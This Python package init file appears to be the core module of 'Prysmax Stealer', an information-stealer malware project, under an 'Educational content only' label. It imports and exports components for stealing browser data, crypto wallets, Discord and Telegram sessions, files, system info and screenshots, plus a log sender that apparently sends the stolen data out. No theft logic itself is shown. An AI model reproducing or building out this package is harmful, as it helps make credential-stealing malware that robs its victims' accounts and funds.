#!/usr/bin/env python3
"""
Prysmax Stealer Core Module
Educational content only
"""

from .stealer import PrysmaxStealer
from .browsers import BrowserStealer
from .wallets import WalletStealer
from .discord import DiscordStealer
from .telegram import TelegramStealer
from .system import SystemInfo
from .files import FileStealer
from .screenshot import ScreenshotCapture
from .sender import LogSender

__all__ = [
    'PrysmaxStealer',
    'BrowserStealer',
    'WalletStealer',
    'DiscordStealer',
    'TelegramStealer',
    'SystemInfo',
    'FileStealer',
    'ScreenshotCapture',
    'LogSender'
]

